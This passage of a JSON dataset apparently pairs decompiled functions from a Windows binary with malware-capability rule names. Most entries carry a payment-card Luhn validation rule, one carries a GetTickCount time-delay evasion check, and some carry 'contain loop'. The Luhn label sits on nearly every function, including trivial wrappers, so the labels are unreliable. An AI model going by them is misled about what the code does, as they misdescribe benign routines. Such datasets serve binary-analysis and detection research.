        "decompiled_code": "\nvoid fcn.00423344(void)\n\n{\n    uint uVar1;\n    int32_t *in_FS_OFFSET;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t iStack80;\n    uint uStack76;\n    uchar *puStack72;\n    int32_t iStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint var_18h;\n    uint rclsid;\n    uint var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    puStack72 = &stack0xfffffffc;\n    uStack64 = 0x423419;\n    iStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack68;\n    uStack76 = 0x4233a7;\n    iStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack80;\n    fcn.00422fe4();\n    uVar1 = fcn.00406f3c();\n    iVar3 = 0x423428;\n    puVar2 = &rclsid;\n    sub.ole32.dll_CoCreateInstance(puVar2, 0, 5, 0x423428, uVar1);\n    fcn.00422fa8();\n    *in_FS_OFFSET = puVar2;\n    *in_FS_OFFSET = iVar3;\n    iStack80 = 0x423420;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 317
    },
    "00423994": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00423994(int32_t arg_8h)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = *(arg_8h + -4);\n    var_4h._0_1_ = 6;\n    fcn.0040daf0(0, &var_8h);\n    fcn.00404eb4();\n    return;\n}\n",
        "token_count": 103
    },
    "00424340": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00424340(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00404610();\n    *(in_EAX + 4) = 0;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 144
    },
    "00425860": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00425860(uint param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack172;\n    uint uStack168;\n    uchar *puStack164;\n    uint var_90h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    puStack164 = &stack0xfffffffc;\n    var_4h = NULL;\n    uStack168 = 0x425929;\n    uStack172 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff54;\n    if ((-1 < param_2) && (iVar2 = fcn.0040669c(),  param_2 < iVar2)) {\n        uVar1 = *(*(in_EAX + 0x50) + 0xc + param_2 * 0x18);\n        (**(**(in_EAX + 0xc) + 0x24))(*(in_EAX + 0xc));\n        uVar3 = fcn.00425570();\n        if ((uVar3 & 0x80000000) == 0) {\n            var_ch = 0;\n            var_10h = 0;\n            (**(*var_4h + 0x14))(var_4h, &fcn.00425860::var_ch, &fcn.00425860::var_10h);\n            uVar3 = (**(*var_4h + 0x18))(var_4h, uVar1, &fcn.00425860::var_8h, &fcn.00425860::var_90h);\n            if ((uVar3 & 0x80000000) == 0) {\n                (**(*var_4h + 0xc))(var_4h, var_8h);\n            }\n        }\n        (**(**(in_EAX + 0xc) + 0x1c))(*(in_EAX + 0xc));\n    }\n    *in_FS_OFFSET = uStack172;\n    puStack164 = 0x425930;\n    uStack168 = 0x425928;\n    fcn.00406f3c();\n    return;\n}\n",
        "token_count": 514
    },
    "0042593c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042593c(uint *arg_8h)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *in_EDX;\n    uint *puVar4;\n    uint *puVar5;\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack1332;\n    uint uStack1328;\n    uchar *puStack1324;\n    uint var_518h;\n    uint var_4c0h;\n    uint var_48ch;\n    uint32_t var_488h;\n    uint var_480h;\n    int32_t var_54h;\n    int32_t *var_50h;\n    uint var_4ch;\n    int32_t *var_4h;\n    \n    var_4h = NULL;\n    puStack1324 = 0x425962;\n    fcn.00405f08();\n    uStack1328 = 0x425a74;\n    piStack1332 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffacc;\n    *in_EDX = 0;\n    *var_50h = 0;\n    puStack1324 = &stack0xfffffffc;\n    (**(**(in_EAX + 0xc) + 0x24))(*(in_EAX + 0xc));\n    (**(**(in_EAX + 0x38) + 0x10))(*(in_EAX + 0x38));\n    iVar3 = fcn.00425570();\n    if (iVar3 == 0) {\n        (**(*var_4h + 0x10))(var_4h, &fcn.0042593c::var_54h);\n        fcn.00406134();\n        cVar2 = fcn.0042467c();\n        if (cVar2 != '\\0') {\n            fcn.00403ae4();\n            puVar4 = *(var_54h + 0x44);\n            puVar5 = &fcn.0042593c::var_518h;\n            for (iVar3 = 0x16; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar5 = *puVar4;\n                puVar4 = puVar4 + 1;\n                puVar5 = puVar5 + 1;\n            }\n            fcn.004030ec();\n            *in_EDX = var_48ch;\n            *var_50h = (var_488h ^ var_488h >> 0x1f) - (var_488h >> 0x1f);\n            *arg_8h = var_480h;\n        }\n    }\n    (**(**(in_EAX + 0x38) + 0x18))(*(in_EAX + 0x38), 0, 0);\n    piVar1 = *(in_EAX + 0xc);\n    (**(*piVar1 + 0x1c))();\n    *in_FS_OFFSET = piVar1;\n    fcn.00405fd8(0x425a7b);\n    fcn.00406f3c();\n    return;\n}\n",
        "token_count": 699
    },
    "00425ab0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00425ab0(void)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack48;\n    int32_t *piStack44;\n    int32_t *piStack40;\n    int32_t *piStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_5h;\n    \n    puStack28 = 0x425abe;\n    iVar1 = fcn.00404a0c();\n    uStack32 = 0x425b43;\n    piStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    piStack40 = 0x425adc;\n    puStack28 = &stack0xfffffffc;\n    fcn.0042553c();\n    piStack40 = *(iVar1 + 0xc);\n    piStack44 = 0x425ae8;\n    (**(*piStack40 + 0x24))();\n    piStack44 = *(iVar1 + 0x38);\n    piStack48 = 0x425af4;\n    (**(*piStack44 + 0x10))();\n    piStack48 = 0x425afc;\n    fcn.004254c4();\n    piStack48 = 0x425b04;\n    fcn.004254dc();\n    *in_FS_OFFSET = piStack44;\n    piStack36 = 0x425b4a;\n    piStack44 = 0x425b38;\n    piStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    piStack40 = &stack0xfffffffc;\n    fcn.00404630();\n    *in_FS_OFFSET = piStack48;\n    return;\n}\n",
        "token_count": 382
    },
    "00426d0c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00426d0c(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((in_EAX != 0) && (in_EAX != *0x4aaa1c)) {\n        sub.gdi32.dll_DeleteObject();\n    }\n    return;\n}\n",
        "token_count": 62
    },
    "00426e08": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00426e08(ushort param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    ushort extraout_CX;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_1 = extraout_CX;\n        param_2 = extraout_DL;\n    }\n    *(in_EAX + 0x20) = param_1;\n    sub.kernel32.dll_InitializeCriticalSection();\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = in_EAX + 8;\n    }\n    return in_EAX;\n}\n",
        "token_count": 166
    },
    "00426e68": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00426e68(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_EnterCriticalSection(in_EAX + 8);\n    return;\n}\n",
        "token_count": 39
    },
    "00426e74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00426e74(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_LeaveCriticalSection(in_EAX + 8);\n    return;\n}\n",
        "token_count": 40
    },
    "00427028": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00427028(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x427041;\n    fcn.00426e68();\n    uStack32 = 0x427091;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar1 = *(param_2 + 0x10);\n    puStack28 = &stack0xfffffffc;\n    iVar2 = fcn.00426e80();\n    *(param_2 + 0x10) = iVar2;\n    if (iVar1 != iVar2) {\n        fcn.0040483c();\n    }\n    fcn.00426f64();\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x427098;\n    uStack32 = 0x427090;\n    fcn.00426e74();\n    return;\n}\n",
        "token_count": 258
    },
    "00427190": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00427190(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    puStack24 = 0x4271a7;\n    iVar1 = fcn.00419980();\n    uStack28 = 0x42722d;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    while (var_4h < *(iVar1 + 8)) {\n        fcn.00419610();\n        fcn.0042881c();\n        var_4h = var_4h + 1;\n        fcn.00428b84();\n    }\n    fcn.00427120();\n    fcn.00427120();\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x427234;\n    if (-1 < var_4h + -1) {\n        do {\n            uStack28 = 0x427219;\n            fcn.00419610();\n            uStack28 = 0x42721e;\n            fcn.00428a54();\n            var_4h = var_4h + -1;\n        } while (var_4h != 0);\n    }\n    uStack28 = 0x42722c;\n    fcn.004199e4();\n    return;\n}\n",
        "token_count": 345
    },
    "00427974": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00427974(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    *0x4a1ce4 = 0;\n    uVar1 = fcn.00426e80();\n    *(in_EAX + 0x10) = uVar1;\n    *(in_EAX + 0x18) = 0xff000008;\n    *(in_EAX + 0x1c) = *0x4aaa24;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 209
    },
    "00427a0c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00427a0c(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x427a27;\n    cVar1 = fcn.004047cc();\n    if (cVar1 != '\\0') {\n        puStack20 = 0x427a37;\n        fcn.004276c0();\n        uStack24 = 0x427ac7;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack32 = 0x427a4f;\n        puStack20 = &stack0xfffffffc;\n        fcn.004276c0();\n        uStack36 = 0x427aaa;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        fcn.004270a4();\n        fcn.00427b48();\n        if (*(in_EAX + 0x1c) != *(param_2 + 0x1c)) {\n            fcn.00427e8c();\n            fcn.00427ea8();\n        }\n        *in_FS_OFFSET = uStack40;\n        puStack32 = 0x427ab1;\n        uStack36 = 0x427aa9;\n        fcn.004276d0();\n        return;\n    }\n    puStack20 = 0x427ad9;\n    fcn.00419bb8();\n    return;\n}\n",
        "token_count": 406
    },
    "00427dc4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00427dc4(void)\n\n{\n    fcn.004278b4();\n    fcn.00427af8();\n    return;\n}\n",
        "token_count": 34
    },
    "00427df0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00427df0(void)\n\n{\n    fcn.00427ae0();\n    fcn.00427af8();\n    return;\n}\n",
        "token_count": 34
    },
    "00427ed4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00427ed4(uint param_1, uchar param_2)\n\n{\n    fcn.00427ae0(param_2);\n    fcn.00427af8();\n    return;\n}\n",
        "token_count": 47
    },
    "00427f90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00427f90(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    uVar1 = fcn.00426e80();\n    *(in_EAX + 0x10) = uVar1;\n    *(in_EAX + 0x18) = 4;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 174
    },
    "00427ffc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00427ffc(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x428017;\n    cVar1 = fcn.004047cc();\n    if (cVar1 != '\\0') {\n        puStack20 = 0x428027;\n        fcn.004276c0();\n        uStack24 = 0x42809c;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack32 = 0x42803f;\n        puStack20 = &stack0xfffffffc;\n        fcn.004276c0();\n        uStack36 = 0x42807f;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        fcn.004270a4();\n        fcn.004281e4();\n        *in_FS_OFFSET = uStack40;\n        puStack32 = 0x428086;\n        uStack36 = 0x42807e;\n        fcn.004276d0();\n        return;\n    }\n    puStack20 = 0x4280ae;\n    fcn.00419bb8();\n    return;\n}\n",
        "token_count": 334
    },
    "00428124": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00428124(void)\n\n{\n    fcn.004280b4();\n    fcn.004280cc();\n    return;\n}\n",
        "token_count": 32
    },
    "0042825c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042825c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    uVar1 = fcn.00426e80();\n    *(in_EAX + 0x10) = uVar1;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 159
    },
    "004282c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004282c4(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x4282df;\n    cVar1 = fcn.004047cc();\n    if (cVar1 != '\\0') {\n        puStack20 = 0x4282eb;\n        fcn.004276c0();\n        uStack24 = 0x428354;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack32 = 0x428303;\n        puStack20 = &stack0xfffffffc;\n        fcn.004276c0();\n        uStack36 = 0x428337;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        fcn.004270a4();\n        *in_FS_OFFSET = uStack40;\n        puStack32 = 0x42833e;\n        uStack36 = 0x428336;\n        fcn.004276d0();\n        return;\n    }\n    puStack20 = 0x428366;\n    fcn.00419bb8();\n    return;\n}\n",
        "token_count": 324
    },
    "004283d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004283d8(uint param_1, uint param_2)\n\n{\n    fcn.00428388(*0x4a1f6c, *0x4a1f70, param_2, *0x4a1f78);\n    return;\n}\n",
        "token_count": 65
    },
    "00428554": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00428554(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00404610();\n    sub.kernel32.dll_InitializeCriticalSection();\n    iVar1 = fcn.00427974();\n    *(in_EAX + 0xc) = iVar1;\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x428db4;\n    *(iVar1 + 0x14) = in_EAX + 0x38;\n    iVar1 = fcn.00427f90();\n    *(in_EAX + 0x10) = iVar1;\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x428dd4;\n    *(iVar1 + 0x14) = in_EAX + 0x38;\n    iVar1 = fcn.0042825c();\n    *(in_EAX + 0x14) = iVar1;\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x428df4;\n    *(iVar1 + 0x14) = in_EAX + 0x38;\n    *(in_EAX + 0x20) = 0xcc0020;\n    *(in_EAX + 8) = *0x428614;\n    fcn.004198f8();\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = in_EAX + 0x38;\n    }\n    return in_EAX;\n}\n",
        "token_count": 420
    },
    "004286fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004286fc(int32_t *arg_8h)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *arg_8h_00;\n    uint var_14h;\n    int32_t var_4h;\n    \n    if (arg_8h != NULL) {\n        cVar1 = (**(*arg_8h + 0x1c))();\n        if (cVar1 == '\\0') {\n            (**(*in_EAX + 0x10))();\n            fcn.00428c3c();\n            fcn.004283fc();\n            uVar2 = fcn.0042767c();\n            sub.gdi32.dll_SetBkColor(in_EAX[1], uVar2);\n            uVar2 = fcn.0042767c();\n            sub.gdi32.dll_SetTextColor(in_EAX[1], uVar2);\n            iVar3 = (**(*arg_8h + 0x20))();\n            iVar3 = iVar3 + var_4h;\n            arg_8h_00 = &var_14h;\n            (**(*arg_8h + 0x2c))();\n            fcn.004181c0(arg_8h_00, iVar3);\n            (**(*arg_8h + 0x14))();\n            (**(*in_EAX + 0xc))();\n        }\n    }\n    return;\n}\n",
        "token_count": 321
    },
    "004289bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.004289bc(void)\n\n{\n    ulong uStack16;\n    \n    fcn.00428974();\n    return uStack16;\n}\n",
        "token_count": 33
    },
    "004289d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.004289d8(void)\n\n{\n    uint uStack12;\n    \n    fcn.00428974();\n    return CONCAT44(uStack12, uStack12);\n}\n",
        "token_count": 40
    },
    "00428acc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00428acc(uint param_1, uint *param_2)\n\n{\n    fcn.00428844(*param_2, param_2[1]);\n    return;\n}\n",
        "token_count": 44
    },
    "00428be8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00428be8(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uStack16;\n    uint uStack12;\n    \n    if (param_2 != *(in_EAX + 4)) {\n        if (*(in_EAX + 4) != 0) {\n            fcn.00428b84();\n            fcn.00428aa4();\n            *(in_EAX + 0x18) = uStack16;\n            *(in_EAX + 0x1c) = uStack12;\n            *(in_EAX + 4) = 0;\n            *(in_EAX + 8) = *(in_EAX + 8) & 0xfe;\n        }\n        if (param_2 != 0) {\n            *(in_EAX + 8) = *(in_EAX + 8) | 1;\n            *(in_EAX + 4) = param_2;\n            fcn.00428acc();\n        }\n    }\n    return;\n}\n",
        "token_count": 228
    },
    "00428ebc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00428ebc(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffecc;\n    uint uStack280;\n    uint uStack276;\n    uchar *puStack272;\n    uint var_104h;\n    uint var_100h;\n    \n    puStack272 = &stack0xfffffffc;\n    uStack276 = 0x428f58;\n    uStack280 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack280;\n    iVar1 = sub.kernel32.dll_GetLastError_1();\n    if (iVar1 != 0) {\n        in_stack_fffffecc = 0x1000;\n        iVar1 = sub.kernel32.dll_FormatMessageA(0x1000, 0, iVar1, 0x400, &var_100h, 0x100, 0);\n        if (iVar1 != 0) {\n            fcn.004056dc();\n            fcn.0040d9f8();\n            fcn.00404eb4();\n            goto code_r0x00428f3f;\n        }\n    }\n    fcn.00428e68();\ncode_r0x00428f3f:\n    *in_FS_OFFSET = in_stack_fffffecc;\n    fcn.0040546c(0x428f5f);\n    return;\n}\n",
        "token_count": 298
    },
    "004290f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004290f4(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    return (in_EAX * param_2 + (param_1 - 1U) & ~(param_1 - 1U)) / 8;\n}\n",
        "token_count": 72
    },
    "004293dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004293dc(uint param_1, int32_t *param_2)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar4 = *param_2 + -1;\n    if (0 < iVar4) {\n        iVar3 = 1;\n        do {\n            puVar1 = in_EAX + iVar3 * 4;\n            puVar2 = in_EAX + iVar3 * 3;\n            puVar2[2] = puVar1[2];\n            puVar2[1] = puVar1[1];\n            *puVar2 = *puVar1;\n            iVar3 = iVar3 + 1;\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n    }\n    if (*param_2 < 0x100) {\n        fcn.00403ae4();\n        *param_2 = 0x100;\n    }\n    return;\n}\n",
        "token_count": 232
    },
    "004294ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004294ac(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffbb8;\n    uint var_424h;\n    uint var_420h;\n    uint uStack1056;\n    uint uStack1052;\n    uchar *puStack1048;\n    uint uStack1044;\n    uint var_408h;\n    uchar var_404h [28];\n    int32_t lppe;\n    uint var_3e4h;\n    uchar auStack996 [988];\n    uint hdc;\n    \n    uStack1044 = 0x4294d8;\n    fcn.004030ec();\n    uStack1044 = 0;\n    puStack1048 = 0x4294df;\n    hdc = sub.user32.dll_GetDC();\n    uStack1052 = 0x4295a9;\n    uStack1056 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffbe0;\n    puStack1048 = &stack0xfffffffc;\n    iVar1 = sub.gdi32.dll_GetDeviceCaps();\n    if (0xf < iVar1) {\n        sub.gdi32.dll_GetSystemPaletteEntries(hdc, 0, 8, &stack0xfffffbf8);\n        in_stack_fffffbb8 = hdc;\n        if (lppe == 0xc0c0c0) {\n            sub.gdi32.dll_GetSystemPaletteEntries(hdc, iVar1 + -8, 1, &fcn.004294ac::lppe);\n            sub.gdi32.dll_GetSystemPaletteEntries(hdc, iVar1 + -7, 7, &stack0xfffffc1c);\n            sub.gdi32.dll_GetSystemPaletteEntries(hdc, 7, 1, &fcn.004294ac::var_3e4h);\n        }\n        else {\n            sub.gdi32.dll_GetSystemPaletteEntries(hdc, iVar1 + -8, 8, &fcn.004294ac::var_3e4h);\n        }\n    }\n    *in_FS_OFFSET = in_stack_fffffbb8;\n    sub.user32.dll_ReleaseDC(0, hdc, 0x4295b0);\n    return;\n}\n",
        "token_count": 477
    },
    "00429920": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00429920(int32_t arg_8h)\n\n{\n    uint8_t *in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint8_t *in_EDX;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar4 = *in_EDX - **(arg_8h + 8);\n    uVar5 = in_EDX[1] - *(*(arg_8h + 8) + 4);\n    uVar6 = *in_EAX - **(arg_8h + 8);\n    uVar1 = in_EAX[1] - *(*(arg_8h + 8) + 4);\n    if ((((uVar6 ^ uVar6 >> 0x1f) - (uVar6 >> 0x1f) < (uVar4 ^ uVar4 >> 0x1f) - (uVar4 >> 0x1f)) ||\n        (((0 < uVar4 && (uVar6 < uVar4)) ||\n         (iVar2 = (uVar1 ^ uVar1 >> 0x1f) - (uVar1 >> 0x1f),  iVar2 < (uVar5 ^ uVar5 >> 0x1f) - (uVar5 >> 0x1f))))) ||\n       ((0 < uVar5 && (uVar1 < uVar5)))) {\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = CONCAT31(iVar2 >> 8, 1);\n    }\n    return uVar3;\n}\n",
        "token_count": 387
    },
    "00429cbc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
